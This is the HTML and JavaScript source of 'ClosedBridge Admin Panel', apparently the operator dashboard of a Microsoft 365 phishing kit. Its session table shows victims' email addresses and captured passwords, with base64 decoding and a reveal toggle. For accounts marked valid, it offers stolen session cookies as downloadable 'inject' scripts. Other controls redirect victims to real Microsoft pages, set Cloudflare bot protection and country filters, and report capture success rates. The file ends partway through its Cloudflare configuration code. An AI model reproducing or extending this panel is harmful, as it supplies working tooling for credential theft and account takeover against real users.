<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClosedBridge Admin Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f8fafc;
            color: #1e293b;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
            margin-bottom: 20px;
        }

        .header {
            padding: 30px 0;
            text-align: center;
            border-bottom: 1px solid #e2e8f0;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 8px;
        }

        .header p {
            color: #64748b;
            font-size: 16px;
            font-weight: 500;
        }

        .auth-section {
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            padding: 24px;
            margin-bottom: 24px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
        }

        .auth-section.authenticated {
            background: #f0fdf4;
            border-color: #22c55e;
        }

        .auth-label {
            color: #475569;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .auth-form {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }

        .token-input {
            padding: 12px 16px;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            background: #ffffff;
            color: #1e293b;
            font-size: 14px;
            min-width: 200px;
            outline: none;
            transition: border-color 0.2s;
        }

        .token-input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        .auth-btn {
            background: #3b82f6;
            color: #fff;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: background-color 0.2s;
            font-size: 14px;
        }

        .auth-btn:hover {
            background: #2563eb;
        }

        .logout-btn {
            background: #ef4444;
            margin-left: 0;
        }

        .logout-btn:hover {
            background: #dc2626;
        }

        .auth-success {
            color: #16a34a;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .dashboard-section {
            background: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            margin-bottom: 24px;
            overflow: hidden;
        }

        .section-header {
            background: #f8fafc;
            padding: 16px 20px;
            border-bottom: 1px solid #e2e8f0;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            user-select: none;
            transition: background-color 0.2s;
        }

        .section-header:hover {
            background: #f1f5f9;
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            color: #1e293b;
            margin: 0;
        }

        .dropdown-arrow {
            font-size: 14px;
            color: #64748b;
            transition: transform 0.2s;
        }

        .section-content {
            padding: 20px;
            display: none;
        }

        .section-content.expanded {
            display: block;
        }

        .dashboard-title {
            font-size: 20px;
            font-weight: 600;
            color: #1e293b;
            margin: 0 0 20px 0;
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }

        .dashboard-card {
            background: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 20px;
            display: flex;
            align-items: center;
            transition: all 0.2s ease;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .dashboard-card:hover {
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            transform: translateY(-1px);
        }

        .dashboard-card.success {
            border-color: #22c55e;
            background: #f0fdf4;
        }

        .dashboard-card.error {
            border-color: #ef4444;
            background: #fef2f2;
        }

        .dashboard-card.info {
            border-color: #3b82f6;
            background: #eff6ff;
        }

        .dashboard-card-icon {
            font-size: 24px;
            margin-right: 16px;
            opacity: 0.8;
        }

        .dashboard-card-content {
            flex: 1;
        }

        .dashboard-card-number {
            font-size: 28px;
            font-weight: 700;
            color: #1e293b;
            line-height: 1;
            margin-bottom: 4px;
        }

        .dashboard-card.success .dashboard-card-number {
            color: #16a34a;
        }

        .dashboard-card.error .dashboard-card-number {
            color: #dc2626;
        }

        .dashboard-card.info .dashboard-card-number {
            color: #2563eb;
        }

        .dashboard-card-label {
            font-size: 14px;
            color: #64748b;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            background: #ffffff;
            color: #1e293b;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        .form-row {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .form-row .form-group {
            flex: 1;
            min-width: 200px;
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            background: #ffffff;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #e2e8f0;
        }

        .data-table th {
            background: #f8fafc;
            padding: 16px;
            text-align: left;
            font-weight: 600;
            color: #374151;
            border-bottom: 1px solid #e2e8f0;
            font-size: 14px;
        }

        .data-table td {
            padding: 16px;
            border-bottom: 1px solid #f1f5f9;
            vertical-align: middle;
            font-size: 14px;
            color: #1e293b;
        }

        .data-table tr:hover td {
            background: #f8fafc;
        }

        .data-table tr:last-child td {
            border-bottom: none;
        }

        .email-cell {
            font-weight: 600;
            color: #1e293b;
        }

        .password-container {
            position: relative;
            display: inline-block;
            width: 100%;
        }

        .password-masked,
        .password-revealed {
            font-family: 'Inter', sans-serif;
            background: #f8fafc;
            padding: 8px 12px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            font-size: 14px;
            color: #1e293b;
        }

        .password-revealed {
            background: #fff7ed;
            border-color: #fb923c;
            word-break: break-all;
        }

        .reveal-btn {
            background: #6b7280;
            color: #fff;
            padding: 6px 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            margin-left: 8px;
            font-family: 'Inter', sans-serif;
            transition: background-color 0.2s;
        }

        .reveal-btn:hover {
            background: #4b5563;
        }

        .download-btn {
            background: #16a34a;
            color: #fff;
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 13px;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            transition: background-color 0.2s;
        }

        .download-btn:hover {
            background: #15803d;
        }

        .session-info {
            font-size: 12px;
            color: #64748b;
            margin-top: 4px;
            font-family: 'Inter', sans-serif;
        }

        .auth-status {
            margin-bottom: 20px;
            font-weight: 600;
            font-size: 16px;
            color: #1e293b;
        }



        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #f1f5f9;
        }

        ::-webkit-scrollbar-thumb {
            background: #cbd5e1;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #94a3b8;
        }

        .cloudflare-control-panel {
            background: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 20px;
        }

        .btn {
            background: #3b82f6;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: background-color 0.2s;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }

        .btn:hover {
            background: #2563eb;
        }

        .btn-success {
            background: #22c55e;
        }

        .btn-success:hover {
            background: #16a34a;
        }

        .btn-danger {
            background: #ef4444;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-secondary {
            background: #6b7280;
        }

        .btn-secondary:hover {
            background: #4b5563;
        }

        .btn-sm {
            padding: 8px 16px;
            font-size: 13px;
        }

        .cf-control-btn.cf-emergency {
            background: #ef4444;
            border-color: #ef4444;
        }

        .cf-control-btn.cf-emergency:hover {
            background: #dc2626;
        }

        .cf-control-btn.cf-disable {
            background: #6b7280;
            border-color: #6b7280;
        }

        .cf-control-btn.cf-disable:hover {
            background: #4b5563;
        }

        .cf-select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            background: #ffffff;
            color: #1e293b;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            margin-bottom: 12px;
            outline: none;
        }

        .cf-select:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }

        .control-description {
            font-size: 14px;
            color: #64748b;
            font-style: italic;
            margin-top: 8px;
            line-height: 1.4;
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 16px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-success {
            background: #dcfce7;
            color: #166534;
        }

        .status-error {
            background: #fee2e2;
            color: #991b1b;
        }

        .status-info {
            background: #dbeafe;
            color: #1e40af;
        }

        .loading, .error, .no-sessions {
            text-align: center;
            padding: 40px;
            color: #64748b;
            font-size: 16px;
            font-family: 'Inter', sans-serif;
        }

        .error {
            color: #dc2626;
        }

        @media (max-width: 768px) {
            .container {
                margin: 10px;
                padding: 16px;
            }

            .header h1 {
                font-size: 24px;
            }

            .auth-section {
                flex-direction: column;
                align-items: stretch;
            }

            .auth-form {
                justify-content: stretch;
            }

            .token-input {
                min-width: auto;
            }

            .dashboard-grid {
                grid-template-columns: 1fr;
            }

            .form-row {
                flex-direction: column;
            }

            .form-row .form-group {
                min-width: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ClosedBridge Admin Panel</h1>
            <p>Link Management Room</p>
        </div>

        <!-- Authentication Section -->
        <div id="auth-section" class="auth-section">
            <div class="auth-label">Authentication Required</div>
            
            <div id="auth-form" class="auth-form">
                <input type="password" 
                       id="token-input" 
                       class="token-input" 
                       placeholder="Enter admin token..." 
                       onkeypress="if(event.key==='Enter') authenticate()">
                <button onclick="authenticate()" class="auth-btn">Login</button>
            </div>
            <div id="auth-success" class="auth-success" style="display: none;">
                ✅ Access Granted
                <button onclick="logout()" class="auth-btn logout-btn">Logout</button>
            </div>
        </div>

        <!-- Analytics Dashboard -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('analytics')">
                <h2 class="section-title">📊 Analytics Dashboard</h2>
                <span class="dropdown-arrow" id="analytics-arrow">▼</span>
            </div>
            <div id="analytics-content" class="section-content expanded">
                <div class="dashboard-grid">
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">👥</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="total-visits">-</div>
                            <div class="dashboard-card-label">Total Visits</div>
                        </div>
                    </div>
                    <div class="dashboard-card success">
                        <div class="dashboard-card-icon">✅</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="valid-entries">-</div>
                            <div class="dashboard-card-label">Valid Entries</div>
                        </div>
                    </div>
                    <div class="dashboard-card error">
                        <div class="dashboard-card-icon">❌</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="invalid-entries">-</div>
                            <div class="dashboard-card-label">Invalid Entries</div>
                        </div>
                    </div>
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">📈</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="success-rate">-</div>
                            <div class="dashboard-card-label">Success Rate</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Cloudflare Configuration -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('cloudflare')">
                <h2 class="section-title">☁️ Cloudflare Configuration</h2>
                <span class="dropdown-arrow" id="cloudflare-arrow">▼</span>
            </div>
            <div id="cloudflare-content" class="section-content">
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Email Address</label>
                        <input type="email" id="cf-email" class="form-input" placeholder="your@email.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Global API Key</label>
                        <input type="password" id="cf-api-key" class="form-input" placeholder="Enter API key">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Zone ID</label>
                        <input type="text" id="cf-zone-id" class="form-input" placeholder="Enter zone ID">
                    </div>
                </div>
                
                <div style="display: flex; gap: 12px; margin-bottom: 16px;">
                    <button onclick="toggleTokenVisibility()" id="toggle-token-btn" class="btn btn-secondary btn-sm">
                        Show API Key
                    </button>
                    <button onclick="saveCloudflareConfig()" id="save-config-btn" class="btn btn-success">
                        Save Configuration
                    </button>
                </div>

                <div id="cf-config-status" class="status-badge status-error">
                    ⚠️ Not Configured
                </div>
            </div>
        </div>

        <!-- Redirect Control -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('redirect')">
                <h2 class="section-title">🎯 Redirect Control</h2>
                <span class="dropdown-arrow" id="redirect-arrow">▼</span>
            </div>
            <div id="redirect-content" class="section-content">
                <div class="form-group">
                    <label class="form-label">Current Target URL:</label>
                    <div id="current-redirect-display" style="padding: 12px; background: #f8fafc; border: 1px solid #e2e8f0; color: #1e293b; font-family: 'Inter', sans-serif; font-size: 14px; border-radius: 6px; word-break: break-all;">
                        Loading...
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group" style="flex: 2;">
                        <label class="form-label">Redirect Destination:</label>
                        <select id="redirect-destination" class="form-input">
                            <option value="https://office.com">Microsoft Office (Default)</option>
                            <option value="https://outlook.office.com/mail/">Outlook Mail</option>
                            <option value="https://www.microsoft.com">Microsoft Home</option>
                            <option value="https://portal.azure.com">Azure Portal</option>
                            <option value="https://teams.microsoft.com">Microsoft Teams</option>
                            <option value="https://onedrive.live.com">OneDrive</option>
                            <option value="https://www.office.com/apps">Office Apps</option>
                            <option value="https://admin.microsoft.com">Microsoft 365 Admin</option>
                            <option value="https://security.microsoft.com">Microsoft Security</option>
                            <option value="https://google.com">Google</option>
                            <option value="custom">Custom URL...</option>
                        </select>
                    </div>
                    <div style="display: flex; gap: 12px; align-items: end;">
                        <button onclick="loadRedirectConfig()" class="btn btn-secondary">
                            Refresh
                        </button>
                        <button onclick="updateProjectRedirect()" class="btn btn-success">
                            Update Project
                        </button>
                    </div>
                </div>

                <div class="form-group">
                    <input type="url" id="custom-redirect-url" class="form-input" placeholder="Enter custom URL..." style="display: none;">
                </div>

                <div id="redirect-status" class="status-badge status-info">
                    📍 Status: Ready
                </div>
            </div>
        </div>

        <!-- Security Controls -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('security')">
                <h2 class="section-title">🛡️ Security Controls</h2>
                <span class="dropdown-arrow" id="security-arrow">▼</span>
            </div>
            <div id="security-content" class="section-content">

                <div class="dashboard-grid">
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">📊</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="cf-status">Loading</div>
                            <div class="dashboard-card-label">System Status</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">🤖</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="bot-fight-status">Off</div>
                            <div class="dashboard-card-label">Bot Protection</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">🔒</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="security-level-status">Off</div>
                            <div class="dashboard-card-label">Security Level</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">🌐</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="browser-check-status">Off</div>
                            <div class="dashboard-card-label">Browser Check</div>
                        </div>
                    </div>
                </div>

                <div style="display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 16px;">
                    <button onclick="toggleBotFight()" id="bot-fight-btn" class="btn">
                        Toggle Bot Fight
                    </button>
                    <button onclick="toggleBrowserCheck()" id="browser-check-btn" class="btn">
                        Toggle Browser Check
                    </button>
                    <button onclick="enableUnderAttack()" class="btn btn-danger">
                        Emergency Mode
                    </button>
                    <button onclick="disableAllProtection()" class="btn btn-secondary">
                        Disable All
                    </button>
                </div>

                <div class="form-group">
                    <label class="form-label">Security Level:</label>
                    <select id="security-level-select" onchange="setSecurityLevel()" class="form-input">
                        <option value="off">Off</option>
                        <option value="essentially_off">Essentially Off</option>
                        <option value="low">Low</option>
                        <option value="medium">Medium</option>
                        <option value="high">High</option>
                        <option value="under_attack">Under Attack</option>
                    </select>
                </div>
            </div>
        </div>

        <!-- Country Access Control -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('country')">
                <h2 class="section-title">🌍 Country Access Control</h2>
                <span class="dropdown-arrow" id="country-arrow">▼</span>
            </div>
            <div id="country-content" class="section-content">

                <div class="dashboard-grid" style="margin-bottom: 20px;">
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">📋</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="country-rules-count">0</div>
                            <div class="dashboard-card-label">Active Rules</div>
                        </div>
                    </div>
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">🌍</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="country-access-status">Open</div>
                            <div class="dashboard-card-label">Access Mode</div>
                        </div>
                    </div>
                </div>

                <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #1e293b; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Create New Country Rule</h3>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Action Type:</label>
                            <select id="country-action-select" class="form-input">
                                <option value="block">Block Countries</option>
                                <option value="allow_only">Allow Only</option>
                            </select>
                        </div>
                        <div class="form-group" style="flex: 2;">
                            <label class="form-label">Country Codes:</label>
                            <input type="text" id="country-codes-input" class="form-input" placeholder="e.g., US,CA,GB">
                        </div>
                        <div style="display: flex; align-items: end;">
                            <button onclick="createCountryRule()" id="create-country-rule-btn" class="btn btn-success">
                                Create Rule
                            </button>
                        </div>
                    </div>
                    
                    <p style="font-size: 14px; color: #64748b; margin-bottom: 12px;">
                        Examples: US,CA,GB (US, Canada, UK) | CN,RU,KP (China, Russia, N.Korea) | DE,FR,ES (Germany, France, Spain)
                    </p>
                    
                    <div class="form-group">
                        <input type="text" id="country-rule-name" class="form-input" placeholder="Rule description (optional)">
                    </div>
                </div>

                <div style="background: #ffffff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px;">
                    <h3 style="color: #1e293b; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Active Country Rules</h3>
                    <div id="country-rules-container" style="min-height: 40px;">
                        <div style="color: #64748b; font-size: 14px; text-align: center; padding: 20px;">
                            Loading country rules...
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Sessions Database -->
        <div class="dashboard-section">
            <div class="section-header" onclick="toggleSection('sessions')">
                <h2 class="section-title">🗺 Session Database</h2>
                <span class="dropdown-arrow" id="sessions-arrow">▼</span>
            </div>
            <div id="sessions-content-wrapper" class="section-content expanded">
                <div id="loading" class="loading">
                    Loading session data...
                </div>

                <div id="error" class="error" style="display: none;">
                    Error loading session data
                </div>

                <div id="sessions-content" style="display: none;">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>Email Address</th>
                                <th>Password</th>
                                <th>Download</th>
                                <th>Session Info</th>
                            </tr>
                </thead>
                <tbody id="sessions-tbody">
                </tbody>
            </table>
        </div>

        <div id="no-sessions" class="no-sessions" style="display: none;">
            NO CLASSIFIED SESSIONS FOUND
        </div>
    </div>

    <script>
        // Authentication state
        let isAuthenticated = false;
        let adminToken = null;

        // Check if user is already authenticated on page load
        function checkAuthOnLoad() {
            const storedToken = localStorage.getItem('adminToken');
            if (storedToken) {
                adminToken = storedToken;
                updateAuthUI(true);
                // Load analytics immediately
                setTimeout(() => {
                    loadAnalytics();
                    loadSessions();
                }, 100);
            } else {
                updateAuthUI(false);
            }
        }

        // Update authentication UI
        function updateAuthUI(authenticated) {
            isAuthenticated = authenticated;
            const authSection = document.getElementById('auth-section');
            const authForm = document.getElementById('auth-form');
            const authSuccess = document.getElementById('auth-success');
            const authStatus = document.getElementById('auth-status');
            const loading = document.getElementById('loading');
            const sessionsContent = document.getElementById('sessions-content');
            const noSessions = document.getElementById('no-sessions');

            if (authenticated) {
                authSection.classList.add('authenticated');
                authForm.style.display = 'none';
                authSuccess.style.display = 'block';
                loading.style.display = 'block';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
            } else {
                authSection.classList.remove('authenticated');
                authForm.style.display = 'block';
                authSuccess.style.display = 'none';
                loading.style.display = 'none';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                document.getElementById('error').style.display = 'none';
            }
        }

        // Authenticate with token
        async function authenticate() {
            const tokenInput = document.getElementById('token-input');
            const token = tokenInput.value.trim();

            if (!token) {
                alert('SECURITY ALERT: TOKEN REQUIRED FOR ACCESS');
                return;
            }

            try {
                // Test the token by making a request to the sessions endpoint
                const response = await fetch('/api/admin/sessions?token=' + encodeURIComponent(token));

                if (response.ok) {
                    adminToken = token;
                    localStorage.setItem('adminToken', token);
                    updateAuthUI(true);
                    loadSessions();
                    loadAnalytics(); // Ensure analytics load after authentication
                    tokenInput.value = '';
                } else if (response.status === 401) {
                    alert('ACCESS DENIED: INVALID TOKEN DETECTED');
                } else {
                    alert('AUTHENTICATION FAILED: SYSTEM ERROR');
                }
            } catch (error) {
                console.error('Authentication error:', error);
                alert('NETWORK ERROR: CONNECTION TO MAINFRAME FAILED');
            }
        }

        // Logout
        function logout() {
            adminToken = null;
            localStorage.removeItem('adminToken');
            updateAuthUI(false);
        }

        // Get stored token for API calls
        function getStoredToken() {
            return adminToken || localStorage.getItem('adminToken') || '';
        }

        // Toggle password visibility
        function togglePassword(index, password) {
            const passwordDiv = document.getElementById(`password-${index}`);
            const button = document.getElementById(`reveal-btn-${index}`);

            if (passwordDiv.classList.contains('password-masked')) {
                // Reveal password
                passwordDiv.className = 'password-revealed';
                passwordDiv.textContent = password;
                button.textContent = 'HIDE';
            } else {
                // Hide password
                passwordDiv.className = 'password-masked';
                const passwordMask = '█'.repeat(Math.min(password.length, 12));
                passwordDiv.textContent = passwordMask;
                button.textContent = 'SHOW';
            }
        }

        async function loadSessions() {
            if (!isAuthenticated) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/sessions?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    // Token expired or invalid
                    logout();
                    alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                    return;
                }

                const sessions = await response.json();

                document.getElementById('loading').style.display = 'none';

                // Show all sessions (both valid and invalid)
                if (sessions.sessions.length === 0) {
                    document.getElementById('no-sessions').style.display = 'block';
                    return;
                }

                const tbody = document.getElementById('sessions-tbody');
                tbody.innerHTML = '';

                sessions.sessions.forEach((session, index) => {
                    const row = document.createElement('tr');

                    // Style the row based on status
                    if (session.status === 'invalid') {
                        row.style.backgroundColor = 'rgba(255, 51, 51, 0.1)';
                        row.style.borderLeft = '4px solid #ef4444';
                    } else {
                        row.style.backgroundColor = 'rgba(0, 255, 0, 0.05)';
                        row.style.borderLeft = '4px solid #22c55e';
                    }

                    // Handle password column - show password for all entries with mask/reveal functionality
                    let passwordColumn = '';
                    if (session.password) {
                        // Decode base64 password if present
                        let decodedPassword = session.password;
                        try {
                            decodedPassword = atob(session.password);
                        } catch (e) {
                            decodedPassword = session.password;
                        }
                        const passwordMask = '█'.repeat(Math.min(decodedPassword.length, 12));

                        passwordColumn = `
                            <div class="password-container">
                                <div id="password-${index}" class="password-masked">
                                    ${passwordMask}
                                </div>
                                <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
                                    id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                            </div>
                        `;
                    } else if (session.status === 'valid') {
                        // Valid session but no password captured - check if it might be in the session file
                        passwordColumn = `<span class="status-badge" style="background: #fef3c7; color: #92400e;">⚠️ Password Not Displayed</span>`;
                    } else if (session.status === 'invalid') {
                        // Invalid entry - show the reason
                        const reason = session.reason || 'FAILED ENTRY';
                        passwordColumn = `<span class="status-badge status-error">❌ ${reason}</span>`;
                    } else {
                        // Fallback for other cases
                        passwordColumn = `<span style="color: #666;">N/A - NO PASSWORD</span>`;
                    }

                    // Handle inject script column - fix the download URL
                    let injectColumn = '';
                    if (session.status === 'valid' && session.injectFilename) {
                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
                                           class="download-btn" download="${session.injectFilename}">
                                            DOWNLOAD INJECT
                                        </a>`;
                    } else if (session.status === 'valid' && session.id) {
                        // Try to construct injection filename from session ID
                        const injectFilename = `inject_session_${session.id}.js`;
                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
                                           class="download-btn" download="${injectFilename}">
                                            DOWNLOAD INJECT
                                        </a>`;
                    } else {
                        injectColumn = `<span style="color: #666;">NO INJECT SCRIPT</span>`;
                    }

                    // Status badge (account not found errors are already filtered out)
                    const statusBadge = session.status === 'valid' 
                        ? `<span class="status-badge status-success">✅ Valid</span>`
                        : `<span class="status-badge status-error">❌ Invalid</span>`;

                    row.innerHTML = `
                        <td>${statusBadge}</td>
                        <td class="email-cell">${session.email}</td>
                        <td>${passwordColumn}</td>
                        <td>${injectColumn}</td>
                        <td>
                            <div>ID: ${session.id}</div>
                            <div class="session-info">
                                TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
                            </div>
                            ${session.status === 'valid' ? 
                                `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>
                                 <div class="session-info" style="color: #16a34a;">Status: Successful Authentication</div>` :
                                `<div class="session-info" style="color: #dc2626;">Failure Reason: ${session.reason || 'Unknown Error'}</div>
                                 ${session.errorMessage ? `<div class="session-info" style="color: #ef4444;">Error Details: ${session.errorMessage}</div>` : ''}
                                 <div class="session-info" style="color: #f59e0b;">Status: Failed Authentication</div>`
                            }
                        </td>
                    `;

                    tbody.appendChild(row);
                });

                document.getElementById('sessions-content').style.display = 'block';

            } catch (error) {
                console.error('Error loading sessions:', error);
                document.getElementById('loading').style.display = 'none';
                const errorDiv = document.getElementById('error');
                errorDiv.textContent = `SYSTEM ERROR: ${error.message}`;
                errorDiv.style.display = 'block';
            }
        }

        // Load analytics data
        async function loadAnalytics() {
            if (!isAuthenticated) {
                // Set loading state for analytics
                document.getElementById('total-visits').textContent = '-';
                document.getElementById('valid-entries').textContent = '-';
                document.getElementById('invalid-entries').textContent = '-';
                document.getElementById('success-rate').textContent = '-';
                return;
            }

            try {
                const token = getStoredToken();
                console.log('Loading analytics with token...');

                const response = await fetch(`/api/admin/analytics?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    console.error('Analytics: Unauthorized access');
                    logout();
                    return;
                }

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const analytics = await response.json();
                console.log('Analytics data received:', analytics);

                // Update dashboard cards with animation
                updateAnalyticsCard('total-visits', analytics.totalVisits || 0);
                updateAnalyticsCard('valid-entries', analytics.validEntries || 0);
                updateAnalyticsCard('invalid-entries', analytics.invalidEntries || 0);

                // Calculate success rate
                const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
                const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
                updateAnalyticsCard('success-rate', successRate + '%');

                console.log('Analytics updated successfully');

            } catch (error) {
                console.error('Error loading analytics:', error);
                // Set error state
                document.getElementById('total-visits').textContent = 'ERROR';
                document.getElementById('valid-entries').textContent = 'ERROR';
                document.getElementById('invalid-entries').textContent = 'ERROR';
                document.getElementById('success-rate').textContent = 'ERROR';
            }
        }

        // Helper function to update analytics cards with animation
        function updateAnalyticsCard(elementId, value) {
            const element = document.getElementById(elementId);
            if (element) {
                element.style.opacity = '0.5';
                setTimeout(() => {
                    element.textContent = value;
                    element.style.opacity = '1';
                }, 100);
            }
        }

        // Cloudflare Configuration Functions
        async function loadCloudflareConfig() {
            if (!isAuthenticated) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/config?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    return;
                }

                const data = await response.json();

                if (data.success && data.config) {
                    // Populate form fields with saved configuration
                    document.getElementById('cf-email').value = data.config.email || '';
                    document.getElementById('cf-zone-id').value = data.config.zoneId || '';
                    
                    // Update status based on configuration state
                    if (data.config.configured) {
                        document.getElementById('cf-config-status').innerHTML = 
                            `<span class="status-badge status-success">✅ Configured (${data.config.authMethod === 'token' ? 'API Token' : 'Global API Key'})</span>`;
                    } else {
                        document.getElementById('cf-config-status').innerHTML = 
                            `<span class="status-badge status-error">⚠️ Not Configured</span>`;
                    }
                } else {
                    console.error('Failed to load Cloudflare config:', data.error);
                }
            } catch (error) {
                console.error('Error loading Cloudflare config:', error);
            }
        }

        function toggleTokenVisibility() {
            const apiKeyInput = document.getElementById('cf-api-key');
            const toggleBtn = document.getElementById('toggle-token-btn');

            if (apiKeyInput.type === 'password') {
                apiKeyInput.type = 'text';
                toggleBtn.textContent = 'HIDE';
            } else {
                apiKeyInput.type = 'password';
                toggleBtn.textContent = 'SHOW';
            }
        }

        async function saveCloudflareConfig() {
            if (!isAuthenticated) {
                alert('AUTHENTICATION REQUIRED');
                return;
            }

            const email = document.getElementById('cf-email').value.trim();
            const apiKey = document.getElementById('cf-api-key').value.trim();
